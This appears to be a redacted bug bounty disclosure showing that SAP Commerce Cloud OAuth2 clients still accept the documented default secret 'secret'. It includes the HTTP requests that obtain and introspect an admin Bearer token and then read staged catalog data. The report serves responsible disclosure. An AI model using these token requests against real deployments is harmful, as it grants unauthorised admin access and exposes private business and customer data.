## Vulnerability Details

## Summary:
The SAP Commerce Cloud instance at `████████` has two ████████ OAuth2 clients (`████████` and `████████`) still configured with the default secret `secret` from SAP's sample ImpEx scripts. These credentials are published in SAP Help Portal documentation, so anyone can use them to obtain a valid Bearer token with `ROLE_ADMINGROUP` — the highest privilege level in SAP Commerce. No authentication, no account, no brute force needed.

## Target

- https://████████/authorizationserver/oauth/token
- Affects all 14 ████████ storefronts (DE, UK, FR, IT, ES, NL, BE, AT, PT, SE, DK, FI, ZA + whitelabel-dk)

## Steps to Reproduce

**Step 1** — Request an admin token using the documented sample secret:

```http
POST /authorizationserver/oauth/token HTTP/2
Host: ████████
Content-Type: application/x-www-form-urlencoded
X-HackerOne-Research: c5z5

client_id=████████&client_secret=secret&grant_type=client_credentials
```

Response (200 OK):

```json
{
  "access_token": "████████",
  "token_type": "Bearer",
  "expires_in": 3599
}
```

Decoded JWT payload:

```json
{
  "sub": "████████",
  "roles": ["ROLE_ADMINGROUP"],
  "iss": "https://████████/authorizationserver",
  "exp": 1787612834
}
```

**Step 2** — Same thing works for the CMS manager client:

```
client_id=████████&client_secret=secret&grant_type=client_credentials
```

Returns a token with `ROLE_BASECMSMANAGERGROUP`.

**Step 3** — Confirm the token is active via introspection:

```http
POST /authorizationserver/oauth/introspect HTTP/2
Host: ████████
Authorization: Basic ████████
Content-Type: application/x-www-form-urlencoded

token=████████
```

Response:

```json
{
  "active": true,
  "sub": "████████",
  "roles": ["ROLE_ADMINGROUP"],
  "client_id": "████████",
  "token_type": "Bearer"
}
```

**Step 4** — The admin token gives access to internal data. For example, catalog data including the unpublished Staged version:

```http
GET /occ/v2/████████/catalogs?fields=FULL HTTP/2
Host: ████████
Authorization: Bearer ████████
X-HackerOne-Research: c5z5
```

Returns full catalog structure with both `Online` and `Staged` catalog versions across all ████████ sites.

Additionally, `trusted_client` (the client specifically named in CVE-2026-44761) also exists and authenticates with `secret`, but is currently disabled — meaning someone partially mitigated but missed the ████████ clients.

## Impact

An unauthenticated attacker can obtain admin-level OAuth2 tokens for ████████'s SAP Commerce Cloud using credentials that are publicly documented in SAP's own Help Portal. The `ROLE_ADMINGROUP` role is the highest privilege in SAP Commerce and grants access to any service that accepts OAuth2 Bearer tokens — CMS management, user administration, order data, and platform configuration. The secret `secret` is not a guess or a brute force result, it's the literal sample value from SAP's ImpEx documentation that was never changed for production. This is tracked as CVE-2026-44761 (CVSS 9.1), patched by SAP in July 2026 Security Note 3753495.
